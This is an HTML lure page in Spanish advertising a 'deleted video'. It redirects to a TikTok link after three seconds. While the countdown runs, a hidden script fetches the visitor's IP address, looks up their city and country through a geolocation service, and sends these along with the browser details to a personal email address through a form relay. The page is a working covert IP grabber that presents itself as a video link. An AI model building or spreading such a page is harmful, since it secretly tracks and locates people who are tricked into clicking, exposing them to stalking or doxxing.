<!DOCTYPE html>
<html>
<head>
    <title>Video Exclusivo 🔥</title>
    <meta charset="UTF-8">
    <!-- Redirección automática después de 3 segundos -->
    <meta http-equiv="refresh" content="3;url=https://www.tiktok.com/@pyrogamertf2/video/7156717168741207301?_r=1&u_code=ecd983834lddg4&preview_pb=0&sharer_language=es&_d=ej0ekhg630ec77&share_item_id=7156717168741207301&source=h5_m&timestamp=1771304769&user_id=7332258597617337349&sec_user_id=MS4wLjABAAAAY6QXHkpE9VwYFtn-SX2ZndEiUOKA0sUygHXlI9zMsDP_TRgSazupQUo-ErOcPc4X&item_author_type=2&social_share_type=0&utm_source=whatsapp&utm_campaign=client_share&utm_medium=android&share_iid=7604538390504474389&share_link_id=4c3124a9-197a-447e-9dcf-57ecbe6541b3&share_app_id=1233&ugbiz_name=MAIN&ug_btm=b6880%2Cb2878&link_reflow_popup_iteration_sharer=%7B%22click_empty_to_play%22%3A1%2C%22dynamic_cover%22%3A1%2C%22follow_to_play_duration%22%3A-1.0%2C%22profile_clickable%22%3A1%7D&enable_checksum=1">
    <style>
        body {
            background: #0a0a0a;
            color: white;
            font-family: Arial;
            text-align: center;
            padding: 50px;
        }
        .container {
            max-width: 600px;
            margin: auto;
        }
        h1 {
            color: #ff0050;
            animation: parpadeo 1s infinite;
        }
        @keyframes parpadeo {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        img {
            border-radius: 20px;
            box-shadow: 0 0 30px #ff0050;
            max-width: 100%;
        }
        .countdown {
            margin-top: 20px;
            color: #888;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔥 VIDEO QUE ELIMINARON 🔥</h1>
        <img src="https://i.imgur.com/placeholder.jpg" alt="Video exclusivo">
        <p>Video cargado...</p>
        <div class="countdown">Redirigiendo a TikTok en 3 segundos...</div>
    </div>

    <script>
        // Capturar IP y enviar por email
        fetch('https://api.ipify.org?format=json')
            .then(r => r.json())
            .then(data => {
                const ip = data.ip;
                
                // Obtener ubicación aproximada
                fetch(`https://ipapi.co/${ip}/json/`)
                    .then(r => r.json())
                    .then(info => {
                        // Enviar TODO a tu email
                        fetch('https://formsubmit.co/ajax/ramirothebaut@gmail.com', {
                            method: 'POST',
                            headers: { 
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify({
                                IP: ip,
                                Pais: info.country_name || 'Desconocido',
                                Ciudad: info.city || 'Desconocida',
                                Fecha: new Date().toLocaleString(),
                                Navegador: navigator.userAgent
                            })
                        })
                        .then(() => console.log('✅ IP enviada:', ip))
                        .catch(err => console.log('Error email:', err));
                    });
            });
    </script>
</body>
</html>

